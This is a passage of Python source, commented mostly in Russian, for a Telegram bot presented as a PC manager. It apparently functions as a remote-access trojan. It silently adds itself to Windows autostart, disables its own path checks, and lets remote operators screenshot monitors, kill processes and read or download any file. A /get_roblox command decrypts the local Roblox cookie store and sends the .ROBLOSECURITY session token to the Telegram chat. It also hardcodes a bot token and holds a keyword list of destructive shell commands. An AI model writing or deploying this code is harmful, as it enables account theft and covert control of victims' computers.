#!/usr/bin/env python3
"""
Улучшенная версия бота для управления ПК через Telegram
- Безопасная обработка путей
- Оптимизированная работа с памятью
- Улучшенная обработка ошибок
- Модульная архитектура
- Использованы: os.scandir, LRU PathEncoder, BytesIO для скриншотов,
  background процесс-каша, logging, dataclass(slots=True)
- Интеграция: Roblox Cookie Extractor как команда /get_roblox
- Дополнительные оптимизации: улучшенная безопасность путей, обработка больших файлов,
  поиск файлов, улучшенный вывод команд, ограничения на чтение контента
"""

import os
import sys
import json
import base64
import tempfile
import threading
import secrets
import traceback
import io
import time
import glob  # Added for file search functionality
from pathlib import Path
from typing import Dict, List, Tuple, Optional, Any
from dataclasses import dataclass
from enum import Enum
from collections import OrderedDict
import logging
import re
import shutil
import win32crypt

import psutil
import telebot
from telebot.types import (
    Message,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    ForceReply
)
import mss
from PIL import Image
import winreg
import subprocess

# --- Logging setup ---
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s"
)
logger = logging.getLogger("pcmanagerbot")


# --- Config ---
class Config:
    """Конфигурация приложения"""
    TOKEN = "8266249827:AAFeZbiiV08uZdsXhZEC9XRqnVPRN7vBIL4"
    ADMIN_IDS = [733684380, 5522781317]
    PAGE_SIZE = 10
    MAX_FILE_SIZE = None  # None = без встроенного лимита в коде
    COMMAND_TIMEOUT = 30
    SCREENSHOT_MAX_WIDTH = None  # None = без принудительного сжатия по ширине
    MAX_READ_LINES = 1000  # Limit for reading file content to prevent memory issues
    MAX_READ_SIZE = 5 * 1024 * 1024  # 5MB limit for inline file reading


# --- Types ---
class FileType(Enum):
    FILE = "file"
    FOLDER = "folder"

@dataclass(slots=True)
class FileInfo:
    """Информация о файле/папке (slots для экономии памяти)"""
    name: str
    path: Path
    type: FileType
    size: Optional[int] = None


# --- Security manager ---
class SecurityManager:
    """Менеджер безопасности с убранными ограничениями путей"""

    @staticmethod
    def is_safe_path(path: Path, root: Path = None) -> bool:
        """Разрешаем все пути - убрана проверка безопасности"""
        return True  # Всегда разрешаем доступ

    @staticmethod
    def is_dangerous_command(command: str) -> bool:
        """Проверка на опасные команды"""
        dangerous = {
            'format ', 'del /', 'rm -rf', 'shutdown ', 'restart', 'reboot',
            'mkfs', 'dd if=', 'fdisk', 'chmod 777', 'taskkill /f',
            'rmdir /s', 'rd /s'
        }
        cmd_lower = command.lower()
        return any(danger_cmd in cmd_lower for danger_cmd in dangerous)


# --- PathEncoder: LRU storage ---
class PathEncoder:
    """Безопасное кодирование путей с LRU-удалением старых записей"""

    def __init__(self, max_entries: int = 1000):
        self._storage: "OrderedDict[str, Path]" = OrderedDict()
        self._max_entries = max_entries
        self._lock = threading.Lock()

    def encode(self, path: Path) -> str:
        """Кодирование пути в токен"""
        token = secrets.token_hex(16)
        with self._lock:
            self._storage[token] = path
            while len(self._storage) > self._max_entries:
                self._storage.popitem(last=False)
        return token

    def decode(self, token: str) -> Optional[Path]:
        """Декодирование пути из токена и пометка как недавно использованный"""
        with self._lock:
            path = self._storage.get(token)
            if path is not None:
                self._storage.move_to_end(token)
            return path


# --- Session manager ---
class SessionManager:
    """Управление пользовательскими сессиями без ограничений путей"""

    def __init__(self):
        self.working_dirs: Dict[int, Path] = {}
        self.command_sessions: Dict[int, str] = {}
        self.cmd_sessions: Dict[int, Dict] = {}
        self.task_manager_sessions: Dict[int, Dict] = {}
        self.pending_kills: Dict[str, Dict] = {}
        self.search_sessions: Dict[int, bool] = {}
        self.file_browser_sessions: Dict[int, Dict] = {}

    def get_working_dir(self, user_id: int) -> Path:
        """Получить рабочую директорию пользователя"""
        if user_id not in self.working_dirs:
            # Начинаем с корневой директории системы
            self.working_dirs[user_id] = Path("/") if os.name == 'posix' else Path("C:\\")
        return self.working_dirs[user_id]

    def set_working_dir(self, user_id: int, path: Path) -> None:
        """Установить рабочую директорию пользователя"""
        self.working_dirs[user_id] = path


# --- File manager: use os.scandir for speed ---
class FileManager:
    """Менеджер работы с файлами"""

    @staticmethod
    def list_directory(path: Path, show_hidden: bool = False) -> Tuple[Optional[List[FileInfo]], Optional[str]]:
        """Получить список файлов и папок в директории, используя os.scandir для скорости"""
        try:
            if not path.exists():
                return None, f"❌ Директория не существует: {path}"

            items: List[FileInfo] = []
            with os.scandir(path) as it:
                for entry in it:
                    if not show_hidden and entry.name.startswith('.'):
                        continue

                    entry_path = Path(entry.path)
                    if entry.is_dir(follow_symlinks=False):
                        items.append(FileInfo(
                            name=entry.name,
                            path=entry_path,
                            type=FileType.FOLDER
                        ))
                    else:
                        try:
                            st = entry.stat(follow_symlinks=False)
                            size = st.st_size
                        except OSError:
                            size = None
                        items.append(FileInfo(
                            name=entry.name,
                            path=entry_path,
                            type=FileType.FILE,
                            size=size
                        ))

            items.sort(key=lambda x: (x.type != FileType.FOLDER, x.name.lower()))
            return items, None

        except PermissionError as pe:
            return None, f"❌ Нет доступа к директории: {path}"
        except FileNotFoundError:
            return None, f"❌ Директория не найдена: {path}"
        except OSError as e:
            logger.exception("Ошибка list_directory")
            return None, f"❌ Ошибка чтения директории: {str(e)}"

    @staticmethod
    def format_size(size_bytes: Optional[int]) -> str:
        """Форматирование размера файла — безопасно, если size_bytes None"""
        if size_bytes is None:
            return "—"
        if size_bytes == 0:
            return "0 B"

        units = ["B", "KB", "MB", "GB", "TB"]
        unit_index = 0
        size = float(size_bytes)

        while size >= 1024 and unit_index < len(units) - 1:
            size /= 1024.0
            unit_index += 1

        return f"{size:.1f} {units[unit_index]}"

    @staticmethod
    def read_file_content(file_path: Path, max_lines: int = Config.MAX_READ_LINES) -> Tuple[Optional[List[str]], Optional[str]]:
        """Чтение содержимого файла с ограничением строк для экономии памяти"""
        try:
            if not file_path.exists():
                return None, f"❌ Файл не существует: {file_path}"

            stat = file_path.stat()
            if stat.st_size > Config.MAX_READ_SIZE:
                return None, f"❌ Файл слишком большой для чтения ({FileManager.format_size(stat.st_size)})"

            lines: List[str] = []
            truncated = False
            with file_path.open('r', encoding='utf-8', errors='ignore') as file:
                for i, line in enumerate(file):
                    if i >= max_lines:
                        truncated = True
                        break
                    lines.append(line.rstrip("\n"))
            if truncated:
                lines.append("... (truncated)")
            return lines, None

        except OSError as e:
            logger.exception("Ошибка read_file_content")
            return None, f"❌ Ошибка чтения файла: {str(e)}"


# --- Screenshot manager: use BytesIO to avoid temp files ---
class ScreenshotManager:
    """Менеджер создания скриншотов (возвращает BytesIO объекты)"""

    @staticmethod
    def take_screenshots() -> List[Tuple[io.BytesIO, str]]:
        """Создание скриншотов всех мониторов, возвращает список (BytesIO, filename)"""
        screenshots: List[Tuple[io.BytesIO, str]] = []

        try:
            with mss.mss() as sct:
                monitors = sct.monitors[1:]  # каждый монитор отдельно
                for monitor_num, monitor in enumerate(monitors, 1):
                    sct_img = sct.grab(monitor)
                    image = Image.frombytes('RGB', sct_img.size, sct_img.rgb)
                    if Config.SCREENSHOT_MAX_WIDTH and image.width > Config.SCREENSHOT_MAX_WIDTH:
                        ratio = Config.SCREENSHOT_MAX_WIDTH / image.width
                        new_height = int(image.height * ratio)
                        image = image.resize((Config.SCREENSHOT_MAX_WIDTH, new_height), Image.Resampling.LANCZOS)

                    buf = io.BytesIO()
                    image.save(buf, 'PNG', optimize=True)
                    buf.seek(0)
                    filename = f"monitor_{monitor_num}.png"
                    screenshots.append((buf, filename))

        except OSError as e:
            logger.exception("Ошибка получения информации о мониторах")
            # Резервный вариант через ImageGrab (работает в Windows)
            try:
                from PIL import ImageGrab
                screenshot = ImageGrab.grab()
                buf = io.BytesIO()
                screenshot.save(buf, 'PNG')
                buf.seek(0)
                screenshots.append((buf, "screenshot.png"))
            except OSError as e2:
                logger.exception("Резервный скриншот также не удался")

        return screenshots

    @staticmethod
    def cleanup_temp_buffers(buffers: List[io.BytesIO]) -> None:
        """Очистка потоков"""
        for buf in buffers:
            buf.close()


# --- System manager (autostart) ---
class SystemManager:
    """Менеджер системных операций"""

    @staticmethod
    def add_to_autostart() -> Tuple[bool, str]:
        """Добавление программы в автозагрузку Windows"""
        try:
            if getattr(sys, 'frozen', False):
                exe_path = sys.executable
            else:
                exe_path = Path(sys.argv[0]).absolute()

            key_name = "PCManagerBot"

            with winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE
            ) as key:
                winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, f'"{exe_path}"')

            return True, "✅ Программа добавлена в автозагрузку"

        except OSError as e:
            logger.exception("Ошибка add_to_autostart")
            return False, f"❌ Ошибка добавления в автозагрузку: {str(e)}"

    @staticmethod
    def remove_from_autostart() -> Tuple[bool, str]:
        """Удаление программы из автозагрузки Windows"""
        try:
            key_name = "PCManagerBot"

            with winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE
            ) as key:
                try:
                    winreg.DeleteValue(key, key_name)
                    return True, "✅ Программа удалена из автозагрузки"
                except FileNotFoundError:
                    return False, "⚠️ Программа не была в автозагрузке"

        except OSError as e:
            logger.exception("Ошибка remove_from_autostart")
            return False, f"❌ Ошибка удаления из автозагрузки: {str(e)}"

    @staticmethod
    def check_autostart() -> Tuple[bool, str]:
        """Проверка, добавлена ли программа в автозагрузку"""
        try:
            key_name = "PCManagerBot"

            with winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_READ
            ) as key:
                try:
                    value, _ = winreg.QueryValueEx(key, key_name)
                    return True, "✅ Программа в автозагрузке"
                except FileNotFoundError:
                    return False, "❌ Программа не в автозагрузке"

        except OSError as e:
            logger.exception("Ошибка check_autostart")
            return False, f"❌ Ошибка проверки автозагрузки: {str(e)}"

    @staticmethod
    def auto_add_to_autostart() -> bool:
        """Автоматическое добавление в автозагрузку при запуске"""
        try:
            is_added, _ = SystemManager.check_autostart()
            if not is_added:
                success, message = SystemManager.add_to_autostart()
                if success:
                    logger.info("Автоматически добавлено в автозагрузку")
                    return True
                else:
                    logger.warning(f"Не удалось добавить в автозагрузку: {message}")
                    return False
            else:
                logger.info("Программа уже в автозагрузке")
                return True
        except OSError as e:
            logger.exception("Ошибка auto_add_to_autostart")
            return False


# --- Process manager: background cache to reduce psutil overhead ---
class ProcessManager:
    """Менеджер процессов с фоновым обновлением snapshot"""

    _cache_ts = 0.0
    _cache: List[Dict[str, Any]] = []
    _lock = threading.Lock()
    REFRESH_SECONDS = 2.0  # background refresh frequency
    _bg_thread: Optional[threading.Thread] = None
    _stop_event = threading.Event()

    @staticmethod
    def _refresh_snapshot():
        """Собрать snapshot процессов один раз"""
        procs: List[Dict[str, Any]] = []
        # Инициализируем cpu_percent для всех процессов
        for proc in psutil.process_iter(['pid']):
            try:
                proc.cpu_percent(interval=None)
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass

        time.sleep(0.01)

        for proc in psutil.process_iter(['pid', 'name', 'memory_info', 'username']):
            try:
                info = proc.info
                try:
                    info['cpu_percent'] = proc.cpu_percent(interval=None)
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    info['cpu_percent'] = 0.0
                procs.append(info)
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue

        return procs

    @classmethod
    def _background_worker(cls):
        logger.info("ProcessManager background worker started")
        while not cls._stop_event.is_set():
            try:
                procs = cls._refresh_snapshot()
                with cls._lock:
                    cls._cache = procs
                    cls._cache_ts = time.time()
            except Exception:
                logger.exception("Ошибка в background_worker")
            cls._stop_event.wait(cls.REFRESH_SECONDS)
        logger.info("ProcessManager background worker stopped")

    @classmethod
    def start_background(cls):
        if cls._bg_thread and cls._bg_thread.is_alive():
            return
        cls._stop_event.clear()
        cls._bg_thread = threading.Thread(target=cls._background_worker, daemon=True)
        cls._bg_thread.start()

    @classmethod
    def stop_background(cls):
        cls._stop_event.set()
        if cls._bg_thread:
            cls._bg_thread.join(timeout=1.0)

    @classmethod
    def gather_processes(cls, force_refresh: bool = False) -> List[Dict[str, Any]]:
        """Возвращает кэш процессов; при force_refresh обновляет немедленно"""
        now = time.time()
        with cls._lock:
            if not force_refresh and now - cls._cache_ts < cls.REFRESH_SECONDS and cls._cache:
                return list(cls._cache)
        procs = cls._refresh_snapshot()
        with cls._lock:
            cls._cache = procs
            cls._cache_ts = time.time()
        return procs

    @staticmethod
    def kill_process(pid: int) -> Tuple[bool, str]:
        """Завершение процесса"""
        try:
            process = psutil.Process(pid)
            process_name = process.name()

            process.terminate()
            try:
                process.wait(timeout=3)
                return True, f"✅ Процесс '{process_name}' (PID: {pid}) завершен"
            except psutil.TimeoutExpired:
                process.kill()
                process.wait(timeout=2)
                return True, f"✅ Процесс '{process_name}' (PID: {pid}) принудительно завершен"

        except psutil.NoSuchProcess:
            return False, f"ℹ️ Процесс с PID {pid} не существует"
        except (psutil.AccessDenied, OSError) as e:
            logger.exception("Ошибка kill_process")
            return False, f"❌ Ошибка при завершении PID {pid}: {str(e)}"


# --- Roblox Cookie Integration ---
class RobloxCookieSanitizer:
    """Optimized cookie sanitizer for Roblox with minimal overhead."""
    
    # Pre-compiled patterns for performance
    UNWANTED_PATTERNS = [
        re.compile(r'^GuestData', re.IGNORECASE),
        re.compile(r'^RBXEventTracker', re.IGNORECASE),
        re.compile(r'^rbx-ip', re.IGNORECASE),
        re.compile(r'^RBXSource', re.IGNORECASE),
        re.compile(r'^__RequestVerificationToken', re.IGNORECASE),
    ]
    
    ESSENTIAL_COOKIES = {'.ROBLOSECURITY', 'RBXID', 'RBXIDBK', 'RBXSRC'}
    CONTROL_CHARS = re.compile(r'[\x00-\x1f\x7f]')
    HTTPONLY_PREFIX = re.compile(r'^#HttpOnly_')

    def is_unwanted_cookie(self, name: str, value: str) -> bool:
        """Fast check for unwanted cookies using pre-compiled patterns."""
        if not name or not value.strip():
            return True
            
        if name in self.ESSENTIAL_COOKIES:
            return False
            
        return any(pattern.search(name) for pattern in self.UNWANTED_PATTERNS)

    def parse_cookies(self, cookie_data: str) -> List[Dict[str, str]]:
        """Efficient cookie parsing with minimal memory allocations."""
        if not cookie_data:
            return []
            
        cookies = []
        entries = cookie_data.split(';')
        
        for entry in entries:
            entry = entry.strip()
            if not entry:
                continue
                
            http_only = entry.startswith('#HttpOnly_')
            if http_only:
                entry = entry[10:]  # Remove '#HttpOnly_' prefix
                
            parts = entry.split('\t')
            if len(parts) >= 7:
                cookies.append({
                    'domain': parts[0].strip(),
                    'flag': parts[1].strip(),
                    'path': parts[2].strip(),
                    'secure': parts[3].strip(),
                    'expiration': parts[4].strip(),
                    'name': parts[5].strip(),
                    'value': parts[6].strip(),
                    'http_only': http_only
                })
                
        return cookies

    def sanitize_value(self, value: str) -> str:
        """Fast value sanitization using pre-compiled regex."""
        return self.CONTROL_CHARS.sub('', value.strip())

    def format_output(self, cookies: List[Dict[str, str]]) -> str:
        """Efficient string building for cookie output."""
        return '\n'.join(
            f"{'#HttpOnly_' if c.get('http_only') else ''}{c['domain']}\t"
            f"{c['flag']}\t{c['path']}\t{c['secure']}\t"
            f"{c['expiration']}\t{c['name']}\t{c['value']}"
            for c in cookies
        )

    def process(self, raw_data: str) -> str:
        """Main processing pipeline with minimal intermediate storage."""
        if not raw_data:
            return ""
            
        parsed = self.parse_cookies(raw_data)
        filtered = []
        
        for cookie in parsed:
            name, value = cookie['name'], cookie['value']
            if not self.is_unwanted_cookie(name, value):
                cookie['value'] = self.sanitize_value(value)
                if cookie['value']:  # Only add if value not empty after sanitization
                    filtered.append(cookie)
                    
        # Sort essential cookies first using tuple sorting trick
        filtered.sort(key=lambda x: (x['name'] not in self.ESSENTIAL_COOKIES, x['name']))
        
        return self.format_output(filtered)

def get_roblox_cookies() -> Optional[str]:
    """Optimized main function with streamlined error handling."""
    cookies_path = os.path.join(
        os.getenv("USERPROFILE", ""),
        "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat"
    )

    if not os.path.exists(cookies_path):
        return None

    temp_path = os.path.join(os.getenv("TEMP", ""), "RobloxCookies.dat")
    
    try:
        shutil.copy(cookies_path, temp_path)
        
        with open(temp_path, 'r', encoding='utf-8') as f:
            encoded = json.load(f).get("CookiesData", "")
            
        if not encoded:
            return None
            
        # Single-line decoding and decryption
        decrypted = win32crypt.CryptUnprotectData(
            base64.b64decode(encoded), None, None, None, 0
        )[1]
        
        raw_data = decrypted.decode('utf-8', errors='ignore')
        return RobloxCookieSanitizer().process(raw_data)
        
    except (json.JSONDecodeError, OSError) as e:
        logger.exception("Ошибка get_roblox_cookies")
        return None
    finally:
        try:
            os.remove(temp_path)
        except OSError:
            pass

def validate_output(cookie_string: str) -> bool:
    """Fast validation using generator expression."""
    return any(
        len(parts) >= 7 and parts[5] and parts[6] 
        for parts in (line.split('\t') for line in cookie_string.strip().split('\n'))
    ) if cookie_string else False


# --- Telegram bot main class ---
class TelegramBot:
    """Основной класс бота"""

    def __init__(self):
        self.bot = telebot.TeleBot(Config.TOKEN)
        self.sessions = SessionManager()
        self.file_manager = FileManager()
        self.screenshot_manager = ScreenshotManager()
        self.system_manager = SystemManager()
        self.process_manager = ProcessManager()
        self.security = SecurityManager()
        self.path_encoder = PathEncoder()

        # запускаем background snapshot процессов
        try:
            ProcessManager.start_background()
        except Exception:
            logger.exception("Не удалось запустить background process manager")

        self._register_handlers()

    def _register_handlers(self) -> None:
        """Регистрация обработчиков сообщений"""
        self.bot.message_handler(commands=['start'])(self._handle_start)
        self.bot.message_handler(commands=['screenshot'])(self._handle_screenshot)
        self.bot.message_handler(commands=['taskmanager', 'tm'])(self._handle_taskmanager)
        self.bot.message_handler(commands=['files'])(self._handle_files)
        self.bot.message_handler(commands=['cmd'])(self._handle_cmd)
        self.bot.message_handler(commands=['autostart_on'])(self._handle_autostart_on)
        self.bot.message_handler(commands=['autostart_off'])(self._handle_autostart_off)
        self.bot.message_handler(commands=['autostart_status'])(self._handle_autostart_status)
        self.bot.message_handler(commands=['get_roblox'])(self._handle_get_roblox)

        self.bot.callback_query_handler(func=lambda call: True)(self._handle_callback)
        self.bot.message_handler(func=lambda message: self.sessions.search_sessions.get(message.chat.id))(self._handle_search)
        self.bot.message_handler(func=lambda message: True)(self._handle_text_messages)

    def _is_admin(self, user_id: int) -> bool:
        """Проверка прав администратора"""
        return user_id in Config.ADMIN_IDS

    def _generate_process_keyboard(self, processes: List[Dict], page: int, sort_mode: str) -> InlineKeyboardMarkup:
        """Генерация клавиатуры для диспетчера задач"""
        keyboard = InlineKeyboardMarkup()
        start_idx = page * Config.PAGE_SIZE
        end_idx = start_idx + Config.PAGE_SIZE

        for process in processes[start_idx:end_idx]:
            pid = process.get('pid') or 0
            name = (process.get('name') or 'Unknown')[:30]
            cpu = float(process.get('cpu_percent') or 0.0)
            mem_info = process.get('memory_info')
            memory_mb = round((mem_info.rss / 1024 / 1024), 1) if mem_info else 0.0

            button_text = f"{pid} | {name} | {cpu:.1f}% | {memory_mb}MB"
            if len(button_text) > 64:
                button_text = button_text[:61] + "..."

            keyboard.add(InlineKeyboardButton(button_text, callback_data=f"KILL:{pid}"))

        # Навигация
        total_pages = (len(processes) - 1) // Config.PAGE_SIZE + 1
        nav_buttons = []

        if page > 0:
            nav_buttons.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"PAGE:{page-1}:{sort_mode}"))
        if page < total_pages - 1:
            nav_buttons.append(InlineKeyboardButton("Next ➡️", callback_data=f"PAGE:{page+1}:{sort_mode}"))

        if nav_buttons:
            keyboard.row(*nav_buttons)  # Use row for better alignment

        # Кнопки управления
        keyboard.row(
            InlineKeyboardButton("Sort CPU", callback_data="SORT:cpu"),
            InlineKeyboardButton("Sort MEM", callback_data="SORT:mem")
        )
        keyboard.row(
            InlineKeyboardButton("🔍 Search", callback_data="SEARCH"),
            InlineKeyboardButton("🔄 Reset", callback_data="RESET")
        )

        return keyboard

    def _generate_file_keyboard(self, items: List[FileInfo], page: int, current_path: Path) -> InlineKeyboardMarkup:
        """Генерация клавиатуры для списка файлов с пагинацией"""
        keyboard = InlineKeyboardMarkup()
        start_idx = page * Config.PAGE_SIZE
        end_idx = start_idx + Config.PAGE_SIZE

        for item in items[start_idx:end_idx]:
            if item.type == FileType.FOLDER:
                icon = "📁"
                size_info = ""
                encoded_path = self.path_encoder.encode(item.path)
                callback_data = f"FOLDER:{encoded_path}"
            else:
                icon = "📄"
                size_info = f" ({self.file_manager.format_size(item.size)})"
                encoded_path = self.path_encoder.encode(item.path)
                callback_data = f"DOWNLOAD:{encoded_path}"

            button_text = f"{icon} {item.name}{size_info}"
            if len(button_text) > 64:
                button_text = button_text[:61] + "..."

            keyboard.add(InlineKeyboardButton(button_text, callback_data=callback_data))

        # Навигация
        total_pages = (len(items) - 1) // Config.PAGE_SIZE + 1
        nav_buttons = []

        if page > 0:
            encoded_path = self.path_encoder.encode(current_path)
            nav_buttons.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"FILE_PAGE:{page-1}:{encoded_path}"))
        if page < total_pages - 1:
            encoded_path = self.path_encoder.encode(current_path)
            nav_buttons.append(InlineKeyboardButton("Next ➡️", callback_data=f"FILE_PAGE:{page+1}:{encoded_path}"))

        if nav_buttons:
            keyboard.row(*nav_buttons)

        # Кнопка "Назад" для родительской директории
        if current_path.parent != current_path:
            encoded_parent = self.path_encoder.encode(current_path.parent)
            keyboard.add(InlineKeyboardButton("🔙 Назад", callback_data=f"FOLDER:{encoded_parent}"))

        return keyboard

    def _send_file_to_telegram(self, chat_id: int, file_path: Path, user_id: int) -> Tuple[bool, str]:
        """Отправка файла в Telegram без ограничений путей"""
        try:
            # УБРАНА ПРОВЕРКА БЕЗОПАСНОСТИ
            if not file_path.exists():
                return False, "❌ Файл не существует"

            file_size = file_path.stat().st_size
            filename = file_path.name

            with file_path.open('rb') as file_obj:
                self.bot.send_chat_action(chat_id, 'upload_document')
                self.bot.send_document(chat_id, file_obj, caption=f"📄 {filename}")

            return True, f"✅ Файл отправлен: {filename}"

        except OSError as e:
            logger.exception("_send_file_to_telegram")
            return False, f"❌ Ошибка отправки файла: {str(e)}"

    def _handle_start(self, message: Message) -> None:
        """Обработчик команды /start"""
        if not self._is_admin(message.from_user.id):
            self.bot.reply_to(message, "⛔ Доступ запрещен")
            return

        autostart_status, _ = self.system_manager.check_autostart()
        autostart_text = "✅ ВКЛЮЧЕН" if autostart_status else "❌ ВЫКЛЮЧЕН"

        help_text = f"""
🖥️ Управление ПК через Telegram
📊 Автозагрузка: {autostart_text}

Доступные команды:
/screenshot - Снимок всех экранов
/taskmanager - Диспетчер задач (также /tm)
/cmd - Интерактивная командная строка
/files - Работа с файлами (скачивание, просмотр) - БЕЗ ОГРАНИЧЕНИЙ ПУТЕЙ
/autostart_on - Добавить в автозагрузку
/autostart_off - Удалить из автозагрузки
/autostart_status - Статус автозагрузки
        """
        self.bot.reply_to(message, help_text)

    def _handle_get_roblox(self, message: Message) -> None:
        """Обработчик команды /get_roblox для получения Roblox cookies"""
        if not self._is_admin(message.from_user.id):
            self.bot.reply_to(message, "⛔ Доступ запрещен")
            return

        try:
            # Отправляем сообщение о начале процесса
            msg = self.bot.reply_to(message, "🔍 Поиск cookies Roblox...")
            
            # Получаем cookies
            if sanitized := get_roblox_cookies():
                if validate_output(sanitized):
                    # Извлекаем .ROBLOSECURITY
                    roblosecurity = None
                    for line in sanitized.split('\n'):
                        if '.ROBLOSECURITY' in line:
                            parts = line.split('\t')
                            if len(parts) >= 7 and parts[5] == '.ROBLOSECURITY':
                                roblosecurity = parts[6]
                                break
                    
                    # Формируем ответ
                    response = "✅ Cookies успешно получены!\n\n"
                    
                    if roblosecurity:
                        response += f"🔐 ROBLOSECURITY:\n`{roblosecurity}`\n\n"
                        response += "⚠️ *Никому не передавайте этот токен!*"
                    
                    # Отправляем основной результат
                    self.bot.edit_message_text(
                        response,
                        chat_id=message.chat.id,
                        message_id=msg.message_id,
                        parse_mode='Markdown'
                    )
                    
                    # Если нужно отправить полные cookies (осторожно!)
                    if len(sanitized) < 4000:  # Ограничение Telegram на длину сообщения
                        self.bot.send_message(
                            message.chat.id,
                            f"📦 Полные cookies:\n```\n{sanitized}\n```",
                            parse_mode='Markdown'
                        )
                    else:
                        # Если cookies слишком длинные, отправляем файлом
                        with tempfile.NamedTemporaryFile(delete=False, suffix=".txt", prefix="roblox_cookies_") as f:
                            f.write(sanitized.encode('utf-8'))
                            f.flush()
                            tmp_path = Path(f.name)
                        with tmp_path.open('rb') as file_obj:
                            self.bot.send_document(message.chat.id, file_obj, caption="📁 Полные cookies")
                        try:
                            tmp_path.unlink()
                        except OSError:
                            pass
                        
                else:
                    self.bot.edit_message_text(
                        "❌ Валидация cookies не пройдена",
                        chat_id=message.chat.id,
                        message_id=msg.message_id
                    )
            else:
                self.bot.edit_message_text(
                    "❌ Не удалось найти cookies Roblox\nУбедитесь что игра запускалась на этом компьютере",
                    chat_id=message.chat.id,
                    message_id=msg.message_id
                )
                
        except Exception as e:
            logger.exception("Ошибка в _handle_get_roblox")
            self.bot.reply_to(message, f"❌ Произошла ошибка: {str(e)}")

    def _handle_screenshot(self, message: Message) -> None:
        """Обработчик команды /screenshot"""
        if not self._is_admin(message.from_user.id):
            self.bot.reply_to(message, "⛔ Доступ запрещен")
            return

        try:
            self.bot.reply_to(message, "📸 Делаю скриншоты всех мониторов...")
            screenshots = self.screenshot_manager.take_screenshots()

            if not screenshots:
                self.bot.reply_to(message, "❌ Не удалось сделать скриншоты")
                return

            buffers_to_close: List[io.BytesIO] = []
            for i, (buf, filename) in enumerate(screenshots):
                try:
                    caption = f"📺 Монитор {i+1}" if len(screenshots) > 1 else "📸 Скриншот"
                    # Use buf directly as file-like to avoid memory copy
                    self.bot.send_photo(message.chat.id, buf, caption=caption)
                    buffers_to_close.append(buf)
                except Exception:
                    logger.exception("Ошибка при отправке скриншота")
                    self.bot.reply_to(message, f"❌ Ошибка при отправке скриншота {i+1}")

            self.screenshot_manager.cleanup_temp_buffers(buffers_to_close)

        except Exception:
            logger.exception("_handle_screenshot")
            self.bot.reply_to(message, "❌ Ошибка при создании скриншотов")

    def _handle_taskmanager(self, message: Message) -> None:
        """Обработчик команды /taskmanager"""
        if not self._is_admin(message.from_user.id):
            self.bot.reply_to(message, "⛔ Доступ запрещен")
            return

        processes = self.process_manager.gather_processes()
        processes.sort(key=lambda x: x.get("pid") or 0)

        self.sessions.task_manager_sessions[message.chat.id] = {
            "page": 0,
            "sort": "pid",
            "filtered": processes
        }

        keyboard = self._generate_process_keyboard(processes, 0, "pid")
        self.bot.send_message(
            message.chat.id,
            f"📊 Task Manager — {len(processes)} процессов",
            reply_markup=keyboard
        )

    def _handle_files(self, message: Message) -> None:
        """Обработчик команды /files без ограничений путей"""
        if not self._is_admin(message.from_user.id):
            self.bot.reply_to(message, "⛔ Доступ запрещен")
            return

        try:
            user_id = message.from_user.id
            current_dir = self.sessions.get_working_dir(user_id)

            parts = message.text.split(maxsplit=2)
            if len(parts) < 2:
                help_text = """
📁 Команды для работы с файлами (БЕЗ ОГРАНИЧЕНИЙ ПУТЕЙ):
/files ls [путь] - список файлов в любой директории
/files read <путь> - прочитать любой текстовый файл
/files find <шаблон> - найти файлы по шаблону в любой директории
/files cd <путь> - сменить на любую директорию
/files pwd - показать текущую директорию
/files download <путь> - скачать любой файл

Примеры:
/files ls C:\\
/files ls /home/user
/files read /etc/passwd  (Linux)
/files read C:\\Windows\\System32\\drivers\\etc\\hosts
/files cd D:\\
/files cd /var/log
/files download C:\\Windows\\win.ini
                """
                self.bot.reply_to(message, help_text)
                return

            subcommand = parts[1].lower()

            if subcommand == 'ls':
                target_path_str = parts[2] if len(parts) > 2 else str(current_dir)
                target_path = Path(target_path_str).resolve(strict=False)
                
                # УБРАНА ПРОВЕРКА БЕЗОПАСНОСТИ
                items, error = self.file_manager.list_directory(target_path)

                if error:
                    self.bot.reply_to(message, error)
                else:
                    if not items:
                        response = f"📁 {target_path}\n\nДиректория пуста"
                        self.bot.reply_to(message, response)
                    else:
                        # Сохраняем список файлов в сессии для пагинации
                        self.sessions.file_browser_sessions[user_id] = {
                            "items": items,
                            "current_path": target_path,
                            "page": 0
                        }

                        keyboard = self._generate_file_keyboard(items, 0, target_path)
                        total_pages = (len(items) - 1) // Config.PAGE_SIZE + 1
                        page_info = f" (стр. 1/{total_pages})" if total_pages > 1 else ""
                        response = f"📁 {target_path}\n\nНажмите на файл для скачивания или папку для перехода{page_info}"
                        self.bot.reply_to(message, response, reply_markup=keyboard)

            elif subcommand == 'read':
                if len(parts) < 3:
                    self.bot.reply_to(message, "❌ Использование: /files read <путь_к_файлу>")
                    return

                file_path_str = parts[2]
                file_path = Path(file_path_str).resolve(strict=False)
                
                # УБРАНА ПРОВЕРКА БЕЗОПАСНОСТИ
                stat = file_path.stat()
                if stat.st_size > Config.MAX_READ_SIZE:
                    self.bot.reply_to(message, f"❌ Файл слишком большой для просмотра ({self.file_manager.format_size(stat.st_size)}). Используйте /files download.")
                    return

                lines, error = self.file_manager.read_file_content(file_path)

                if error:
                    self.bot.reply_to(message, error)
                else:
                    content = "\n".join(lines)
                    response = f"📄 {file_path}\n\n{content}"
                    # Если очень большой вывод — отправляем как документ
                    if len(response) > 4000:
                        with tempfile.NamedTemporaryFile(delete=False, suffix=".txt", prefix="file_read_") as tmpf:
                            tmpf.write(response.encode('utf-8', errors='ignore'))
                            tmpf.flush()
                            tmpf_path = Path(tmpf.name)
                        with tmpf_path.open('rb') as fobj:
                            self.bot.send_document(message.chat.id, fobj, caption=f"📄 {file_path} (полный вывод)")
                        try:
                            tmpf_path.unlink()
